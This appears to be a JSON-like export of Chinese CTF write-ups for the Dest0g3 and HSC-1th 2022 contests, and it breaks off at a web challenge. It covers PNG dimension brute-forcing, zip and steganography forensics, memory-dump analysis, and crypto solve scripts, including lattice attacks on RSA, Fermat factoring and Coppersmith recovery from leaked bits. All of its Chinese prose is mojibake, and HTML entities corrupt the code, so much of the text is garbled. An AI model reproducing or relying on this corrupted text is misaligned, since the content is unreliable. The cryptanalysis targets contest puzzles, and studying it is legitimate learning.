ä¹Ÿæ˜¯éé¢„æœŸï¼Œè®¿é—®urlè¿›å…¥äº¤æ˜“0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925ï¼Œåœ¨InputDataé‡Œï¼Œå¯ä»¥æŸ¥çœ‹åˆ°Hexæ•°æ®ï¼Œè½¬å­—ç¬¦ä¸²å¯å¾—åˆ°flagäº”æˆªå­—ç¬¦ä¸²ï¼šDest0g3&#123;tï¼Œ_sup3r_e3ï¼Œhi5_1s_4ï¼Œea5y_pï¼Œ_r1ght?&#125;ï¼ŒæŒ‰è‹±æ–‡å­—é¢æ„æ€æ‹¼æ¥ï¼Œå¾—ï¼šDest0g3&#123;thi5_1s_4_sup3r_e3ea5y_pe1d1ct_r1ght?&#125;ã€‚ â€‹ AIOCR OCR is very useful in ctfï¼ æ›´åƒMiscçš„AIé¢˜ï¼Œpngå›¾ç‰‡æ‰­æ›²ï¼Œåº”è¯¥å®½åº¦ä¸å¯¹ï¼ŒCRCå€¼çˆ†ç ´å®½é«˜ï¼š 123456789101112131415161718192021222324252627import binasciiimport structimport sysfr = open(&#x27;flag_pic.png&#x27;,&#x27;rb&#x27;).read()data = bytearray(fr[0x0c:0x1d])crc32key = eval(&#x27;0x&#x27;+str(binascii.b2a_hex(fr[0x1d:0x21]))[2:-1])n = 4095for w in range(n): width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w)) for h in range(n): height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print(width,height) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(&#x27;flag2.png&#x27;,&#x27;wb&#x27;) fw.write(newpic) fw.close sys.exit() å¾—åˆ°æ­£å¸¸å›¾ç‰‡ï¼š æ‰¾ä¸ªåœ¨çº¿OCRè¯†åˆ«å›¾é‡Œå­—ç¬¦ï¼Œå¾—åˆ°çš„ç»“æœæœ‰éƒ¨åˆ†å­—ç¬¦ä¸æ­£ç¡®ï¼Œæ‰‹åŠ¨ä¿®æ­£ï¼Œå¾—åˆ°ï¼š 12345678910111213141516171819377ABCAF271C000451FCF397500200000000000062000000000000001D9C97C8E004D002485D0022194A676D2FDE351A055c168F9710364AE2D581126E378F3B4c47E15E2E80B74234B849430A221F40C086E06B24ADAAC47F32CB62CADD154B50723E65E50CDF99CC2B953916AD2204D70C15FB493BD4C2E1F93902FB3563190ACEE58CC01621BB2AAAB6EED8CE892FEF5F0927E2C4BCD7C188277D09D0357995A2FB65D31CD99c853D7BAF52EAD8555920D1672B4A3B713917E98FB324AD225A3FA2AFAC1435FFE31ED0C0CEF0CA0B68C0CCCA81C458680D7C75139429D282984933F7ACFDFB127321D9F4EFC0FEAAE92F985D3C457E90AFBC4DA9D11B23E507A0953036A2EC1D75D69CD1F6A9F0790B1AB02D6C2AFFDF66A2E7E56A1070FBCD316813E12DF9E26FC4813D419792A65960D4D97EDFA7A978A0385C04CF36EFDE3B07DF9B9405253EAA838149910F2571FAA4A8E085D1567C5C17C9B3400F91FBFE6B47E052BA07097C9D77803D3A45E3477FE324603179C7CA6A128CDC0F7E834812618AD4C79934226637E9300C5595E355139A2ECF661A5F63750A6A0035ACF52417AF3A1C1FEA14471D074c27F81c719D98717F4ECD32918BD15C18AB93769E94DDEFD3B6FAF4DDD6628BA44BDEF574FCCD5589334EA8063D7B27A2F0600FC864D010A7F0CEC9B9395434878D01943887194342F9D34FC8F12DD4556ED5A5A36667F9319A0395DB9A445B94C44771B406F962B1CFC8535BA0D3EE3DDDEB876C95092AAB192B168A732F3A7B9E8156c403c583983F5527A0D6c5D6928481D56955474046D9FC17A2DE21F3D6FC4c69644E7c6A141BE948A417A33D62C6FF6DFAC702A0FC101748D9A9C64A6A0000010406000109825000070B010001212101000C84D100080A0196EAFE6000000501190A0000000000000000000011190044006500730074003000670033002E00740078007400000019020000140A0100B547E05F6654D8011506010020000000000000 ä»¥Hexä¿å­˜ä¸º7zå‹ç¼©åŒ…æ–‡ä»¶ï¼Œè§£å‹å¾—åˆ° RGVzdDBnM3szNDUxMjA5OC0zMzA5LTc3MTItODg2NS03ODM0NjAyMjE2NDd9ï¼Œbase64è§£ç å³flagï¼šDest0g3&#123;34512098-3309-7712-8865-783460221647&#125;ã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022èµ›","slug":"2022èµ›","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"HSC-1th 2022","slug":"match-HSC-1th-2022","date":"2022-02-20T08:28:40.000Z","updated":"2022-02-21T11:24:05.717Z","comments":true,"path":"2022/02/20/match-HSC-1th-2022/","permalink":"https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/","excerpt":"","text":"â€‹ æœ¬å±ŠHSC1th 2022æ˜¯ç”±ç¤¾ä¼šæˆ˜é˜Ÿçº¢å®¢çªå‡»é˜Ÿï¼ˆHonker Security Commandoï¼‰ä¸¾åŠã€‚ æœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨åœ¨çº¿ç½‘ç»œå®‰å…¨å¤ºæ——æŒ‘æˆ˜èµ›çš„å½¢å¼ï¼Œæ¶µç›–webï¼Œcryptoï¼Œmiscï¼Œreç­‰ä¸»æµæ–¹å‘ï¼Œå¹¶é¢å‘å…¨çƒå¼€æ”¾ã€‚æ¯”èµ›ä¸‰ç”²å¯è·çªå‡»é˜Ÿå‘¨è¾¹ç¤¼å“ã€‚ Rank: 2 MISCSign-in å‰å¾€çº¢å®¢çªå‡»é˜Ÿå…¬ä¼—å·å‘é€â€œHSC2019â€å¹¶ç­¾åˆ°å§ï¼ å…¬ä¼—å·ç­¾åˆ°ã€‚ flag{HSC_W3LC0M3} â€‹ DORAEMONzipå‹ç¼©åŒ…æ³¨é‡Š å“†å•¦Aæ¢¦æŠŠæ³¡å¥½çš„QRæ”¾è¿›å£è¢‹åï¼Œç”¨å…­ä½æ•°å­—æŠŠè‡ªå·±æ”¾å¥½äº†ã€‚ä½ èƒ½æ‰¾åˆ°å®ƒå—ï¼Ÿï¼Œçˆ†ç ´å¾—åˆ°å¯†ç  376852ï¼› å¾—åˆ°pngå›¾ç‰‡ç”¨16è¿›åˆ¶ä¿®æ”¹å™¨ä¿®æ”¹é«˜åº¦ï¼Œå¾—åˆ°ç¼ºå°‘ä¸¤ä¸ªå®šä½å›¾æ¡ˆçš„äºŒç»´ç ï¼› ä¿®å¤ä¸Šæ–¹ä¸¤ä¸ªå®šä½å›¾æ¡ˆï¼Œæ‰«æå¾—flagï¼šflag{sing1emak3r10v3m!sc} â€‹ æ±é—»,äººè¨€å¦pngæ–‡ä»¶åå­˜åœ¨zipå‹ç¼©åŒ…ï¼Œæå–ååœ¨16è¿›åˆ¶æŸ¥çœ‹å™¨ä¸‹ä¿®å¤å‹ç¼©åŒ…ï¼Œå°†ä¸¤å¤„ 4B 50 ä¿®æ”¹ä¸º 50 4Bï¼› å‘ç°zipå‹ç¼©åŒ…åŠ å¯†ï¼Œæ³¨é‡Š qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p ä¸ºé”®ç›˜å¯†ç ï¼Œåœ¨é”®ç›˜ä¸Šç”»å‡ºå…­ä¸ªå­—æ¯ WVALOU ä¸ºè§£å‹å¯†ç ï¼Œå¾—åˆ° flag æ–‡ä»¶ï¼Œ16è¿›åˆ¶æŸ¥çœ‹å‘ç°ä¸ºwavæ–‡ä»¶ç»“æ„ï¼› ä½¿ç”¨audacityæŸ¥çœ‹wavæ–‡ä»¶ï¼Œåœ¨é¢‘è°±å›¾å‘ç°flagï¼šflag:e5353bb7b57578bd4da1c898a8e2d767 â€‹ PERFORMANCE-ARTä¸¤ç§å›¾å½¢æ›¿æ¢å¯†ç çš„æ··åˆï¼Œå…¶ä¸­ä¸€ç§ä¸ºæ ‡å‡†é“¶æ²³å­—æ¯ï¼ˆStandard Galactic Alphabetï¼‰ï¼ŒçŒœæµ‹å¦ä¸€ç§ä»£è¡¨æ•°å­—ï¼Œæ ¹æ®å½¢çŠ¶å’Œå‡ºç°æ¦‚ç‡ï¼ŒçŒœæµ‹å‡ºå‰å‡ ä½ 504B0304140000000ï¼Œä¸ºzipå‹ç¼©åŒ…æ–‡ä»¶å¤´ã€‚ ä¾æ¬¡è¿˜åŸæ‰€æœ‰å­—ç¬¦ï¼š 12345678910504b03041400000008004a7e7253148e1e1e160000001400000006000000756e6b6e6f778bcaadc888322ec9f30b752df70ccfae8cca72b30400504b01021f001400000008004a7e7253148e1e1e1600000014000000060024000000000000002000000000000000756e6b6e6f770a0020000000000001001800778284ef50dcd7016b04efef50dcd701e1b0ef144fdcd701504b05060000000001000100580000003a0000000000 ä¿å­˜ä¸ºzipæ–‡ä»¶ï¼Œæ‰“å¼€å¾—åˆ°å†…å®¹ ZmxhZ3tnNUEwIWkyZjF9ï¼Œbase64è§£ç å¾—flagï¼šflag{g5A0!i2f1} â€‹ WIRESHARKzipå‹ç¼©åŒ…åå­˜åœ¨pngå›¾ç‰‡ï¼Œæå–åä½¿ç”¨zstegæŸ¥çœ‹LSBéšå†™ï¼Œåœ¨ b1,rgb,lsb,xy é€šé“éšå†™äº†ä¸€å¼ pngå›¾ç‰‡ï¼Œæå–ï¼š zsteg -E &quot;b1,rgb,lsb,xy&quot; Untitled1.png &gt; out.png æ˜¯ä¸€å¼ äºŒç»´ç ï¼Œæ‰«æå¾—åˆ°å†…å®¹ wrsak..iehr370ï¼Œæ …æ è§£å¯† wireshark3.7.0ï¼› è§£å‹æœ€å¼€å§‹çš„zipå‹ç¼©åŒ…å¾—åˆ° wiresharkï¼Œ16è¿›åˆ¶æŸ¥çœ‹å‘ç°ä¸ºpdfæ–‡ä»¶ç»“æ„ï¼Œæ–‡ä»¶å¤´è¢«ä¿®æ”¹è¿‡ï¼Œè¿˜åŸä¸º %PDF ï¼ˆ25 50 44 46ï¼‰æ­£å¸¸æ‰“å¼€ï¼Œå†…å®¹æ— æœ‰ç”¨ä¿¡æ¯ï¼ŒçŒœæƒ³ä¸ºPDFéšå†™ï¼› ä½¿ç”¨wbStegoå·¥å…·ä»pdfæ–‡ä»¶æˆåŠŸæå–å‡ºflagï¼šflag{Go0dJ0B_y0ufIndLt} â€‹ PCXP ç™¾åº¦ç½‘ç›˜https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A æå–ç ï¼š1qih å¥¶ç‰›å¿«ä¼ https://cowtransfer.com/s/b76470ddc9e04a è“å¥äº‘https://wwo.lanzouy.com/b030r1x4j å¯†ç :cvi0 æœ¬é¢˜ç›®æ–‡ä»¶PCXP1ä¸PCXP2å‡éœ€è¦ä¸‹è½½ï¼ æœ¬é¢˜æ–‡ä»¶ä¸­flag{raw_Imfig3_mLs3}å±äºå¹²æ‰°é¡¹ ä¸¤ä¸ªdumpå†…å­˜çš„rawæ–‡ä»¶ï¼Œç”¨volatilityåˆ†æã€‚ å…¶ä¸­ä¸€ä¸ªå‘ç° ffflaaagggg.rar æ–‡ä»¶ï¼š 0x000000000227db70 1 0 R--rwd \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\My Documents\\My Music\\ffflaaagggg.rar æ ¹æ®æç¤ºï¼Œå¦ä¸€ä¸ªå‘ç° mirror.rar æ–‡ä»¶ï¼š 0x00000000021221e0 1 0 R--rwd \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\My Documents\\My Music\\mirror.rar åˆ†åˆ«dumpfilesï¼ŒæŒ‰æ³¨é‡Škey:mirror è§£å‹ mirror.rarï¼Œæå– mirror.pngï¼Œå‘ç°ååŠéƒ¨åˆ†æœ‰åè½¬çš„pngï¼Œreverseå¤„ç†å¾—åˆ°pngå†…æœ‰å¯†ç  HSC-1th202248H ï¼› ç”¨å¯†ç è§£å‹ ffflaaagggg.rarï¼Œå¾—åˆ° secret.pcapï¼Œç”¨tsharkæå–USBæµé‡æ— ç»“æœï¼› æŸ¥çœ‹16è¿›åˆ¶å‘ç°å­˜åœ¨PNGæ–‡ä»¶å¤´ï¼Œç”¨foremostæå–å‡ºä¸¤å¼ pngå›¾ç‰‡ï¼Œç”»é¢ç›¸åŒå¤§å°ä¸åŒï¼ŒçŒœæµ‹ä¸ºç›²æ°´å°éšå†™ï¼› ä½¿ç”¨BlindWaterMarkå·¥å…·æå–ï¼š python3 bwmforpy3.py decode 00000030.png 00000094.png out.png å¾—åˆ°flagï¼šflag{Wat3rMarkPtysc} â€‹ CRYPTOEasy SignIn 5445705857464579517A4A48546A4A455231645457464243566B5579556C7053546C4A4E524564565646644D515670455130354C5755644F5231685256314A5452315A5552304E57576C5A49525430395054303950513D3D cipheyä¸€æŠŠæ¢­ï¼Œflagï¼šflag{welc0me_to_my_s1gn_in} â€‹ AFFINE flag{md5(result)} 1234567891011121314151617181920212223242526272829# -*- coding: utf-8 -*-import stringimport hashlibletter=string.ascii_letters+string.digitsdef encrypt(m, c, a, b): for i in range(len(m)): ch=m[i] t=(letter.index(ch) * a + b) % 62 c.append(letter[t]) d = &#x27;&#x27;.join(c) print(d)m = c = []a = b = assert (&quot;flag&quot; in m)print(&quot;åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š&quot;)Cipher = encrypt(m, c, a, b)flag = hashlib.md5(&quot;&quot;.join(str(m)).encode(&quot;utf8&quot;)).hexdigest()#print(flag)&quot;&quot;&quot;åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼šxGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&quot;&quot;&quot; ä»¿å°„å¯†ç åŠ å¯†ï¼Œå…ˆæ ¹æ®å¯†æ–‡å’Œæ˜æ–‡ï¼Œçˆ†ç ´å„ä½ç½®å­˜åœ¨ flag å­—ç¬¦ä¸²æƒ…å†µä¸‹å¯¹åº”çš„ a,b å€¼ï¼Œå†è§£å¯†æ•´ä¸²å¯†æ–‡ã€‚ çˆ†ç ´æ±‚ a,bï¼š 12345678910111213141516171819202122import stringimport hashlibletter=string.ascii_letters+string.digitsdef encrypt(m, a, b): c = [] for i in range(len(m)): ch=m[i] t=(letter.index(ch) * a + b) % 62 c.append(letter[t]) d = &#x27;&#x27;.join(c) return ds=&#x27;xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&#x27;for a in range(50): for b in range(50): Cipher = encrypt(&#x27;flag&#x27;, a, b) for k in range(len(s)-3): if Cipher==s[k:k+4]: print(Cipher,a,b)# korv 11 17 è§£å¯†ï¼š 12345678910111213141516171819a=11b=17def decrypt(m, a, b): import gmpy2 c = [] for i in range(len(m)): ch=m[i] t=((letter.index(ch) - b) * gmpy2.invert(a,62)) % 62 c.append(letter[t]) d = &#x27;&#x27;.join(c) return dm=decrypt(s, a, b)print(m)flag = hashlib.md5(&quot;&quot;.join(str(m)).encode(&quot;utf8&quot;)).hexdigest()print(flag)# Oh62Affine1sSti1lN0tSecureEnoughToProtectflag# 2b9b99caae1cc49e5b5aacbc8cc22350 flagï¼šflag{2b9b99caae1cc49e5b5aacbc8cc22350} â€‹ LINE-GENERATION-TEST â€œSorry, Tazmi, I canâ€™t hold you in my arms anymoreâ€ Who said that? flag{md5(result)} æ ¹æ® enc ç»“æœï¼ŒçŒœæµ‹ä¸º $\\mod 26$ ä¸‹çš„çŸ©é˜µè¿ç®—ï¼Œå€¼å¯¹åº”å­—æ¯åºï¼Œç®€å•ç”¨z3è§£ï¼š 1234567891011121314151617181920212223242526from z3 import *f=[Int(f&#x27;f&#123;i&#125;&#x27;) for i in range(5)]out=[9,23,0,13,19]ss=Solver()ss.add((f[0]+f[1])%26==out[0])ss.add((f[1]+f[4])%26==out[1])ss.add((f[2]+f[3]+f[4])%26==out[2])ss.add((f[1]+f[2]+f[3])%26==out[3])ss.add((f[3])%26==out[4])for i in range(5): ss.add(f[i]&gt;=0) ss.add(f[i]&lt;26)ss.check()m=ss.model()print(m)res=&#x27;&#x27;for i in range(5): res+=chr(m[f[i]].as_long()+ord(&#x27;A&#x27;))print(res)# RSCTF MD5ï¼Œå¾—flagï¼šflag{e4163deba70420c58acb87abcab34141} â€‹ LATTICE 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *from gmpy2 import *flag = b&#x27;flag&#123;******&#125;&#x27;.strip(b&#x27;flag&#123;&#x27;).strip(b&#x27;&#125;&#x27;)_length = len(flag)f1, f2, f3 = [flag[_*_length//3:(_+1)*_length//3] for _ in range(3)]e = 0x10001# part1m1 = bytes_to_long(f1)p1 = getPrime(1024)q1 = getPrime(1024)n1 = p1 * q1phi1 = n1 - p1 - q1 + 1c1 = pow(m1, e, n1)e1 = invert(getPrime(730), phi1)e2 = invert(getPrime(730), phi1)print(f&quot;c1=&#123;c1&#125;&quot;)print(f&quot;n1=&#123;n1&#125;&quot;)print(f&quot;e1, e2=&#123;e1&#125;, &#123;e2&#125;&quot;)# c1=...# n1=...# e1, e2=...# part2m2 = bytes_to_long(f2)p2 = getPrime(1024)q2 = getPrime(1024)n2 = p2 * q2phi2 = n2 - p2 - q2 + 1c2 = pow(m2, e, n2)e1 = invert(getPrime(818), phi2)e2 = invert(getPrime(818), phi2)e3 = invert(getPrime(818), phi2)print(f&quot;c2=&#123;c2&#125;&quot;)print(f&quot;n2=&#123;n2&#125;&quot;)print(f&quot;e1, e2, e3=&#123;e1&#125;, &#123;e2&#125;, &#123;e3&#125;&quot;)# c2=...# n2=...# e1, e2, e3=...# part3m3 = bytes_to_long(f3)nl = []cl = []el = []d = getPrime(890)for _ in range(7): p3 = getPrime(1024) q3 = getPrime(1024) n3 = p3 * q3 phi3 = n3 - p3 - q3 + 1 e3 = invert(d, phi3) c3 = pow(m3, e3, n3) nl.append(n3) el.append(int(e3)) cl.append(int(c3))print(f&quot;nl=&#123;nl&#125;&quot;)print(f&quot;el=&#123;el&#125;&quot;)print(f&quot;cl=&#123;cl&#125;&quot;)# nl=[...]# el=[...]# cl=[...] RSAçš„ä¸¤ç§æ¶‰åŠæ ¼çš„LLLç®—æ³•çš„æ”»å‡»æƒ…å½¢ï¼ˆå¤šç»„ä½è§£å¯†æŒ‡æ•°æ”»å‡»+å…±ç§é’¥æŒ‡æ•°æ”»å‡»ï¼‰ã€‚ Part1ï¼Œ2ç»„ $e$ çš„ä½è§£å¯†æŒ‡æ•°æ”»å‡»ï¼š 12345678910111213141516171819202122232425262728# Sageimport gmpy2N = e1 = e2 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**0.5) M2 = int( gmpy2.mpz(N)**(1+alpha2) ) D = diagonal_matrix(ZZ, [N, M1, M2, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2], [0, e1, -e1, -e1*N], [0, 0, e2, -e2*N], [0, 0, 0, e1*e2] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi = (x[0,1]/x[0,0]*e1).floor() try: d = inverse_mod(65537, phi) m = bytes.fromhex(hex(power_mod(c, d, N))[2:]) if len(m)&lt;20: print(m) break except: pass# b&#x27;89c63fd5-00c&#x27; Part2ï¼Œ3ç»„ $e$ çš„ä½è§£å¯†æŒ‡æ•°æ”»å‡»ï¼š 123456789101112131415161718192021222324252627282930313233343536373839# Sageimport gmpy2N = e1 = e2 = e3 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**(3./2)) M2 = int( gmpy2.mpz(N) ) M3 = int(gmpy2.mpz(N)**(3./2 + alpha2)) M4 = int( gmpy2.mpz(N)**(0.5) ) M5 = int( gmpy2.mpz(N)**(3./2 + alpha2) ) M6 = int( gmpy2.mpz(N)**(1.+alpha2) ) M7 = int( gmpy2.mpz(N)**(1.+alpha2) ) D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2, 0, 0, 0, -N**3], [0, e1, -e1, -e1*N, -e1, 0, e1*N, e1*N**2], [0, 0, e2, -e2*N, 0, e2*N, 0, e2*N**2], [0, 0, 0, e1*e2, 0, -e1*e2, -e1*e2, -e1*e2*N], [0, 0, 0, 0, e3, -e3*N, -e3*N, e3*N**2], [0, 0, 0, 0, 0, e1*e3, 0, -e1*e3*N], [0, 0, 0, 0, 0, 0, e2*e3, -e2*e3*N], [0, 0, 0, 0, 0, 0, 0, e1*e2*e3] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi_ = (e1*x[0,1]/x[0,0]).floor() try: d = inverse_mod(65537, phi_) m = hex(power_mod(c, d, N))[2:] m = bytes.fromhex(hex(power_mod(c, d, N))[2:]) if len(m)&lt;20: print(m) break except: pass# b&#x27;f-4ae0-b369-&#x27; Part3ï¼Œå…±ç§é’¥æŒ‡æ•° $d$ æ”»å‡»ï¼š 12345678910111213141516171819202122232425262728293031323334from gmpy2 import *nl=[...]el=[...]cl=[...]ind=[]nl_s=sorted(nl)for i in range(7): ind.append(nl.index(nl_s[i]))print(ind)e=[]n=[]c=[]for i in range(7): e.append(el[ind[i]]) n.append(nl[ind[i]]) c.append(cl[ind[i]])M=iroot(int(n[6]),int(2))[0]a=[0]*8a[0]=[M,e[0],e[1],e[2],e[3],e[4],e[5],e[6]]a[1]=[0,-n[0],0,0,0,0,0,0]a[2]=[0,0,-n[1],0,0,0,0,0]a[3]=[0,0,0,-n[2],0,0,0,0]a[4]=[0,0,0,0,-n[3],0,0,0]a[5]=[0,0,0,0,0,-n[4],0,0]a[6]=[0,0,0,0,0,0,-n[5],0]a[7]=[0,0,0,0,0,0,0,-n[6]]Mat = matrix(ZZ,a)Mat_LLL=Mat.LLL()d = abs(Mat_LLL[0][0])//Mprint(d)print(bytes.fromhex(hex(pow(c[6],int(d),int(n[6])))[2:]))# b&#x27;5a3d94a20a2c&#x27; è¿æ¥å¾—flagï¼šflag{89c63fd5-00cf-4ae0-b369-5a3d94a20a2c} â€‹ RSA flag{md5(result)} 1234567891011121314151617181920import gmpy2import sympyfrom Crypto.Util.number import *flag = b&#x27;????&#x27;z=getPrime(1024)p=sympy.nextprime(z)q=sympy.prevprime(10*z)n=p*qm=bytes_to_long(flag)e=0xe18ec=pow(m,e,n)print(&quot;n=&quot;,n)print(&quot;c=&quot;,c)#n= ...#c= ... è´¹é©¬åˆ†è§£RSAï¼Œå‘ç° $\\gcd(e,\\varphi(n))=2$ï¼Œä»¤ $eâ€™=\\frac{e}{2},mâ€™=m^2$ï¼Œ å…ˆæ±‚å‡º $mâ€™$ï¼Œå†åˆ©ç”¨Rabinç®—æ³•æ±‚ $m$ã€‚ 12345678910111213141516171819202122232425262728293031323334n = c = e = 0xe18eimport gmpy2p = gmpy2.iroot(n//10,2)[0]while 1: p = gmpy2.next_prime(p) if n%p==0: breakq = n//pf = (p-1)*(q-1)d = gmpy2.invert(e//2,f)mm = pow(c,d,n)print(mm)def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) m = rabin_decrypt(mm,p,q)for i in range(4): try: print(bytes.fromhex(hex(m[i])[2:])) except: pass# b&#x27;flag&#123;6d22773623d3d5c871692e9985de5f16&#125;&#x27; â€‹ BABY-RSA 1234567891011121314151617181920212223242526272829303132333435363738394041424344from Crypto.Util.number import *def lfsr(status,mask): out = (status &lt;&lt; 1) &amp; 0xffffffff i=(status&amp;mask)&amp;0xffffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 out^=lastbit return (out,lastbit)status= 1mask = 0b10110001110010011100100010110101num = bytes_to_long(m)p = getPrime(1024)q = getPrime(1024)n = p*qe = 65537hp = bin(p)[2:]c = pow(num, e, n)print(&quot;n=&quot;,n)print(&quot;c=&quot;,c)f=open(&quot;key&quot;,&quot;w+&quot;,encoding=&#x27;utf-8&#x27;)for i in range(568): curnum = int(hp[i]) (status,out)=lfsr(status,mask) f.write(str(curnum ^ out))f.close()&#x27;&#x27;&#x27;n= ...c= ...&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;key:0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010&#x27;&#x27;&#x27; RSA $p$ é«˜ä½æ³„éœ²æ”»å‡»+LFSRã€‚ å…ˆç”¨LFSRç»“æœå¼‚æˆ–è¿˜åŸ $p$ é«˜ä½ $hp$ï¼š 123456789101112131415161718192021222324def lfsr(status,mask): out = (status &lt;&lt; 1) &amp; 0xffffffff i=(status&amp;mask)&amp;0xffffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 out^=lastbit return (out,lastbit)status= 1mask = 0b10110001110010011100100010110101c = list(&#x27;0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010&#x27;)c=[int(k) for k in c]hp = &#x27;&#x27;for i in range(568): (status,out) = lfsr(status,mask) hp += str(c[i]^out)hp = int(hp, 2)print(hp)# 484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112 æ­¤æ—¶ $hp$ æœ‰568ä½ï¼Œæ ¹æ®Coppersmithå®šç†ï¼Œ1024ä½çš„ $p$ è‡³å°‘éœ€è¦é«˜576ä½æ‰èƒ½æ¢å¤å®Œæ•´ $p$ï¼Œéœ€çˆ†ç ´8ä½äºŒè¿›åˆ¶ä½ï¼š 123456789101112131415161718192021222324252627# Sagen = 9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703hp = 484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112import stringdic = string.digits + &quot;abcdef&quot;for a in dic: for b in dic: pp = hex(hp) + a + b #péœ€è¦ç”¨0è¡¥å…¨åˆ°1024ä½ pp += &#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27; #è¦åŠ çš„æ•°å­—ä¸è¡¥å…¨pæ—¶0çš„ä¸ªæ•°æœ‰å…³ pp = int(pp, 16) p_fake = pp+0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 pbits = 1024 kbits = pbits-576 pbar = p_fake &amp; (2^pbits-2^kbits) #print(&quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits)) PR.&lt;x&gt; = PolynomialRing(Zmod(n)) f = x + pbar try: x0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor &gt;= n^0.4 print(x0 + pbar) except: pass # 90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477 æœ€åå¸¸è§„RSAï¼š 1234567891011p = 90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477n = 9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703c = 3641304537029815746727163894554557322382012539953948183406308231174259571263608621970973671202001456955622458371303424750815017578104069924877881162707673935496925529412748663209884628320657034190702348924814794263041483260377960569530869386619921425415323912964305979776909598200202236912823968867485696101691879580799000240715778010424877093758489309380968229017074542588151574195295436881889313935734282141447498134543053106463951864974512375314091440713165047188590693431938599822340588934591712592995622334522799914563528630705687647950894928965913199772209825508001274120556508220248069647851360567609656517789q = n//pe = 0x10001import gmpy2f = (p-1)*(q-1)d = gmpy2.invert(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;flag&#123;fbbce1e3aa690ebb49039241f940ed26&#125;&#x27; â€‹ WEBCLICKæŸ¥çœ‹æºç ï¼Œæ‰¾åˆ° main.jsï¼Œå‘ç° ZmxhZ3thNTNlMTgzOC01OTczLTRlY2MtOWFjMC00ODZlOTA0NThhMTl9Cg==ï¼Œbase64è§£ç å¾—flagã€‚ â€‹ Web-sign inæç¤ºrobotsåè®®ï¼Œè®¿é—® 